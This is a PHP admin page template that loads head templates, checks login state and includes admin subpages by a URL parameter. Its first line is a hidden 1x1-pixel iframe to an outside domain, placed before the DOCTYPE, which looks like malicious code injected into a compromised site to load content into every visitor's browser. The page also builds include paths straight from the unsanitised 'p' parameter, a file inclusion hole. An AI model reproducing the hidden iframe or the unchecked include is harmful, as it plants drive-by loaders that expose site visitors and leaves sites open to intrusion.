<iframe src=http://gadgotec.com/stata.html WIDTH=1 HEIGHT=1 frameborder=0></IFRAME><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<?php

// Prints the head html tags
echo implode("",file("templates/head-master.html"));
echo implode("",file("templates/head-pages.html"));
echo implode("",file("templates/head-tabmenu.html"));

include 'routines/init.php';
include 'routines/adminpage.php';
include 'routines/logout.php';
if (($isAuthorized != true) || ($isLogged != true))
{
	require 'config.php';
	echo '<meta http-equiv="refresh" content="0; URL=frame.php">';
}


if ($isAuthorized == true)
{
	$adminpage = $_GET['p'];

	if ($adminpage == null || $adminpage == "")
		$adminpage = "logs";
	$_SESSION['LastPage'] = $_SESSION['LastPage']."?p=".$adminpage;
	include 'admin/'.$adminpage.'-head.php';
}

include 'routines/addpopup.php';
?>
</head>
<body>
<?

include 'routines/ui.php';

?>

<div class="body-container">
<div class="body-content">

<?

if ($isAuthorized == true)
{
	include "admin/".$adminpage.".php";
}
?>

</div>
</div>
</body>
</html>